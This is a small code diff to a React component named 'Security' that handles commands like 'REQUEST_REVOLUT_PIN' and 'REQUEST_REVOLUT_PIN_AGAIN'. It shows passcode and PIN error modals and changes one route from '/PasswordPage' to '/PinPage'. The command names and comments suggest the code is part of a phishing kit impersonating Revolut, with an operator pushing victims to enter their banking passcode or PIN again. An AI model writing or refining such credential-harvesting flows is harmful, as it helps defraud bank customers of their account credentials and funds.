@@ -96,7 +96,7 @@ export default function Security() {
             console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
-            navigateWithLoader('/PasswordPage');
+            navigateWithLoader('/PinPage');
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
